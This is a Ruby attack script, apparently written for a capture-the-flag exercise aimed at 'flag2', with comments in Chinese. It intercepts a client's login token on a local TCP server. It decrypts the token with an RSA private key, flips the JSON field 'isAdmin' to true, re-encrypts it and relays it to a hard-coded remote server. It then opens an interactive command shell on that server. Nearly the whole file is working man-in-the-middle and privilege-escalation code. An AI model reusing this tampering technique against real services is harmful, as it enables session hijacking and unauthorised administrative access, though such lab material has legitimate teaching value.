


require 'socket'
require 'openssl'
require 'json'

$token = ""
$state = 0
$serverIP = "140.113.194.85"
$serverPort = 49175
$admin = "admin"

$rsa = OpenSSL::PKey::RSA


# 載入RSA私鑰
$privKey = $rsa.new File.read "priv.pem"
# 載入RSA公鑰
$pubKey = $rsa.new File.read "pubkey.pub"
$header = "00000256"


# 修改封包
def changeAdmin()
	# 將封包解密得到明文
	plainText = $privKey.private_decrypt($token)

	# 把payload拆開
	first = plainText.slice(0,plainText.index("}")+1)
	second = plainText.slice(plainText.index("}")+1,plainText.length-1)

	# 把JSON字串轉換成JSON物件
	first = JSON.parse(first)

	# 修改為admin
	first["isAdmin"] = true

	# 把JSON物件轉為JSON字串
	first = JSON.generate(first)
	
	# 組合原本的明文格式
	plainText = first + second
	puts plainText

	# header 與payload(加密後的明文)黏起來
	$token = $header + $pubKey.public_encrypt(plainText)
	return true
end

# 檢查封包長度是否正確，並且切割封包
def parseMessage()
	if $token.length != 264
		return false
	end
	if $token.include? $header
		$token = $token.split($header)[1]
		return true
	else 
		return false
	end
end



server = TCPServer.new 2000 
loop do
	  client = server.accept    
	  $token = client.gets
	  # 確認封包沒有問題後，開始改權限
	  if parseMessage() 
		  if changeAdmin()
			  break
		  else
		  end
	  else 
		  puts "token error"
	  end

end
server.close

# 轉送封包，等待登入成功後開始送指令找flag2
s = TCPSocket.new '140.113.194.85', 49175
# 轉送封包
s.puts $token
cmd = "first"

while line = s.recv(2048) 
	  puts line         
	  if $state == 0
		# 登入成功
		if line.include? "Login Success"
			$state = 1
			next
		end
	  end
	  # 輸入指令
	  if $state == 1
		  if line.include? cmd
			  next
		  end
		  print "#"
	          cmd = gets
	          s.puts cmd
	  end
end

s.close             



